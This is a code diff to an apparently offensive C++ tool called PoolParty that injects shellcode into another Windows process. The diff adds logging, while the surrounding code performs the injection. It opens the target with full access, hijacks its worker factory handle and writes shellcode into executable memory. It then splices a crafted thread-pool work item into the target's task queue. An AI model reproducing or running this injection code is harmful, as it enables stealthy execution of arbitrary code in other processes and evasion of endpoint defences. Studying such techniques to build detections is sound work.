@@ -8,39 +8,48 @@ PoolParty::PoolParty(DWORD dwTargetPid, unsigned char* cShellcode) {
 	m_szShellcodeSize = 224; // TODO: Fix this disgusting issue
 }
 
+// TODO: Reduce access rights
+// TODO: Should logs be in the inject method?
 std::shared_ptr<HANDLE> PoolParty::GetTargetProcessHandle() {
-	auto hTargetPid = w_OpenProcess(PROCESS_ALL_ACCESS, FALSE, m_dwTargetPid);
-	return hTargetPid;
+	auto p_hTargetPid = w_OpenProcess(PROCESS_ALL_ACCESS, FALSE, m_dwTargetPid);
+	BOOST_LOG_TRIVIAL(info) << boost::format("Retrived handle to the target process: %x") % *p_hTargetPid;
+	return p_hTargetPid;
 }
 
 std::shared_ptr<HANDLE> PoolParty::GetWorkerFactoryHandle() {
 	WorkerFactoryHandleDuplicator Duplicator{ m_dwTargetPid, *m_p_hTargetPid };
-	auto hWorkerFactory = Duplicator.Duplicate(WORKER_FACTORY_ALL_ACCESS);
-	return hWorkerFactory;
+	auto p_hWorkerFactory = Duplicator.Duplicate(WORKER_FACTORY_ALL_ACCESS);
+	BOOST_LOG_TRIVIAL(info) << boost::format("Hijacked worker factory handle from the target process: %x") % *p_hWorkerFactory;
+	return p_hWorkerFactory;
 }
 
 WORKER_FACTORY_BASIC_INFORMATION PoolParty::GetWorkerFactoryBasicInformation() {
 	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
 	w_NtQueryInformationWorkerFactory(*m_p_hWorkerFactory, (WORKERFACTORYINFOCLASS)WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
+	BOOST_LOG_TRIVIAL(info) << "Retrieved target worker factory basic information";
 	return WorkerFactoryInformation;
 }
 
 LPVOID PoolParty::AllocateShellcodeMemory() {
 	LPVOID ShellcodeAddress = AllocateMemory(*m_p_hTargetPid, m_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated shellcode memory in the target process: %p") % ShellcodeAddress;
 	return ShellcodeAddress;
 }
 
 void PoolParty::WriteShellcode() {
 	WriteMemory(*m_p_hTargetPid, m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize);
+	BOOST_LOG_TRIVIAL(info) << "Written shellcode to the target process";
 }
 
 void PoolParty::Inject() {
+	BOOST_LOG_TRIVIAL(info) << boost::format("Starting PoolParty attack against process id: %d") % m_dwTargetPid;
 	m_p_hTargetPid = this->GetTargetProcessHandle();
 	m_p_hWorkerFactory = this->GetWorkerFactoryHandle();
 	m_WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation();
 	m_ShellcodeAddress = this->AllocateShellcodeMemory();
 	this->WriteShellcode();
 	this->SetupExecution();
+	BOOST_LOG_TRIVIAL(info) << "PoolParty attack completed successfully";
 }
 
 PoolParty::~PoolParty() 
@@ -95,11 +104,13 @@ void RemoteWorkItemInsertion::SetupExecution()
 {
 	/* Read the TP_POOL of the target process */
 	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
+	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
 
 	auto TaskQueueHighPriorityList = &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;
 
 	/* Allocate TP_WORK with a custom TP_POOL */
 	auto pWorkItem = w_CreateThreadpoolWork((PTP_WORK_CALLBACK)m_ShellcodeAddress, NULL, NULL);
+	BOOST_LOG_TRIVIAL(info) << "Created TP_WORK structure associated with the shellcode";
 
 	/* 
 		When a task is posted NTDLL would insert the task to the pool task queue list tail
@@ -110,15 +121,19 @@ void RemoteWorkItemInsertion::SetupExecution()
 	pWorkItem->Task.ListEntry.Flink = TaskQueueHighPriorityList;
 	pWorkItem->Task.ListEntry.Blink = TaskQueueHighPriorityList;
 	pWorkItem->WorkState.Exchange = 0x2;
+	BOOST_LOG_TRIVIAL(info) << "Modified the TP_WORK structure to be associated with target process's TP_POOL";
 
 	/* Write the specially crafted work item to the target process address space */
 	auto RemoteWorkItemAddress = (PFULL_TP_WORK)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_WORK memory in the target process: %p") % RemoteWorkItemAddress;
 	WriteMemory(*m_p_hTargetPid, RemoteWorkItemAddress, pWorkItem, sizeof(FULL_TP_WORK));
-	
+	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_WORK structure to the target process";
+
 	/* To complete posting the work item we need to complete the task queue list insertion by modifying the pool side */
 	auto RemoteWorkItemTaskList = &RemoteWorkItemAddress->Task.ListEntry;
 	WriteMemory(*m_p_hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
 	WriteMemory(*m_p_hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
+	BOOST_LOG_TRIVIAL(info) << "Modified the target process's TP_POOL task queue list entry to point to the specially crafted TP_WORK";
 }
 
 RemoteWorkItemInsertion::~RemoteWorkItemInsertion() 
